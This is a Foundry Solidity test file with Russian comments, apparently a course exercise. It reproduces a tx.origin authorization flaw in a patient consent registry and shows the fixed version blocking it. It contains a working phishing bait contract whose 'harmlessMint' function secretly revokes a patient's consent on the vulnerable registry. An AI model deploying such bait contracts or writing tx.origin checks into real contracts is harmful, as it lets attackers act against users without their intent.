// SPDX-License-Identifier: MIT
pragma solidity ^0.8.37;

import {Test} from "forge-std/Test.sol";
import {PatientConsentRegistry} from "../src/PatientConsentRegistry.sol";
import {PatientConsentRegistryVuln} from "../src/PatientConsentRegistryVuln.sol";

interface IConsentRevoker {
    function revokeConsent(bytes32 consentId) external;
}

/**
 * @title ConsentPhisher
 * @notice Задание 3: контракт-приманка для воспроизведения уязвимости
 *         «небезопасное использование tx.origin» (нарушение контроля доступа).
 * @dev    Выглядит для пациента как безобидная функция (минт NFT, лотерея),
 *         но внутри отзывает согласие пациента в реестре — это работает
 *         ТОЛЬКО в уязвимой версии, где revokeConsent авторизует по tx.origin.
 */
contract ConsentPhisher {
    IConsentRevoker public target;
    bytes32 public consentId;

    function setTarget(IConsentRevoker _target, bytes32 _consentId) external {
        target = _target;
        consentId = _consentId;
    }

    /// @dev «Безобидное» действие, которое пациент инициирует добровольно.
    function harmlessMint() external {
        // Пациент думает, что вызывает минт; на деле его tx.origin
        // проходит проверку авторизации в уязвимом контракте.
        target.revokeConsent(consentId);
    }
}

contract ConsentRevocationPhishingTest is Test {
    PatientConsentRegistry internal fixedRegistry;
    PatientConsentRegistryVuln internal vulnRegistry;
    ConsentPhisher internal phisher;

    address internal admin = makeAddr("admin");
    address internal registrar = makeAddr("registrar");
    address internal attacker = makeAddr("attacker");
    address internal patient;
    uint256 internal patientPk;

    bytes32 internal constant CONSENT_ID = keccak256("consent-phish-001");
    bytes32 internal constant DOC_HASH = keccak256("consent-doc-phish");
    uint32 internal constant VERSION = 1;

    function setUp() public {
        (patient, patientPk) = makeAddrAndKey("patient");

        vm.startPrank(admin);
        fixedRegistry = new PatientConsentRegistry(admin);
        vulnRegistry = new PatientConsentRegistryVuln(admin);
        fixedRegistry.setRegistrar(registrar, true);
        vulnRegistry.setRegistrar(registrar, true);
        vm.stopPrank();

        phisher = new ConsentPhisher();
    }

    // ---------- helpers ----------

    function _signFor(address registry_, uint64 expiresAt) internal view returns (bytes memory) {
        // EIP-712 digest зависит от verifyingContract, поэтому подпись
        // считается отдельно для каждого реестра.
        uint256 nonce = PatientConsentRegistry(registry_).nonces(patient);
        bytes32 digest = PatientConsentRegistry(registry_).hashConsent(
            patient,
            registrar,
            DOC_HASH,
            VERSION,
            expiresAt,
            nonce
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(patientPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _registerOnFixed() internal {
        bytes memory sig = _signFor(address(fixedRegistry), 0);
        vm.prank(registrar);
        fixedRegistry.registerConsent(CONSENT_ID, patient, DOC_HASH, VERSION, 0, sig);
    }

    function _registerOnVuln() internal {
        bytes memory sig = _signFor(address(vulnRegistry), 0);
        vm.prank(registrar);
        vulnRegistry.registerConsent(CONSENT_ID, patient, DOC_HASH, VERSION, 0, sig);
    }

    // ---------- 1. Эксплуатация уязвимости (ДО) ----------

    /// @notice УЯЗВИМОСТЬ ВОСПРОИЗВЕДЕНА: пациент вызвал «безобидный» контракт,
    ///         и его согласие отозвано без его воли (авторизация по tx.origin).
    function test_Exploit_VulnerablePhisherRevokesConsent() public {
        _registerOnVuln();
        phisher.setTarget(IConsentRevoker(address(vulnRegistry)), CONSENT_ID);

        // Пациент (EOA) инициирует tx на контракт-приманку:
        // tx.origin = patient, msg.sender внутри registry = phisher.
        vm.prank(patient, patient);
        phisher.harmlessMint();

        // РЕЗУЛЬТАТ АТАКИ: согласие REVOKED, хотя пациент его не отзывал.
        assertEq(
            uint256(vulnRegistry.getConsentStatus(CONSENT_ID)),
            uint256(PatientConsentRegistryVuln.ConsentStatus.REVOKED),
            "consent was revoked without patient intent"
        );
    }

    /// @notice Контроль: прямой вызов от чужого EOA в уязвимой версии
    ///         отклоняется — дефект проявляется только через посредника.
    function test_Vuln_DirectAttackerCannotRevoke() public {
        _registerOnVuln();

        vm.prank(attacker, attacker);
        vm.expectRevert(
            abi.encodeWithSelector(
                PatientConsentRegistryVuln.NotConsentOwner.selector,
                attacker,
                patient
            )
        );
        vulnRegistry.revokeConsent(CONSENT_ID);

        assertEq(
            uint256(vulnRegistry.getConsentStatus(CONSENT_ID)),
            uint256(PatientConsentRegistryVuln.ConsentStatus.ACTIVE)
        );
    }

    // ---------- 2. Проверка после исправления (ПОСЛЕ) ----------

    /// @notice ИСПРАВЛЕНИЕ ПОДТВЕРЖДЕНО: тот же вызов через приманку
    ///         в исправленном контракте откатывается (msg.sender = фишер).
    function test_Fixed_PhisherAttackReverted() public {
        _registerOnFixed();
        phisher.setTarget(IConsentRevoker(address(fixedRegistry)), CONSENT_ID);

        vm.prank(patient, patient);
        vm.expectRevert(
            abi.encodeWithSelector(
                PatientConsentRegistry.NotConsentOwner.selector,
                address(phisher),
                patient
            )
        );
        phisher.harmlessMint();

        // Согласие остаётся действующим.
        assertEq(
            uint256(fixedRegistry.getConsentStatus(CONSENT_ID)),
            uint256(PatientConsentRegistry.ConsentStatus.ACTIVE),
            "consent must stay ACTIVE after failed attack"
        );
    }

    /// @notice Исправленный контракт: легитимный отзыв пациентом напрямую
    ///         по-прежнему работает (регрессии не внесено).
    function test_Fixed_PatientStillCanRevokeDirectly() public {
        _registerOnFixed();

        vm.prank(patient, patient);
        fixedRegistry.revokeConsent(CONSENT_ID);

        assertEq(
            uint256(fixedRegistry.getConsentStatus(CONSENT_ID)),
            uint256(PatientConsentRegistry.ConsentStatus.REVOKED)
        );
    }
}
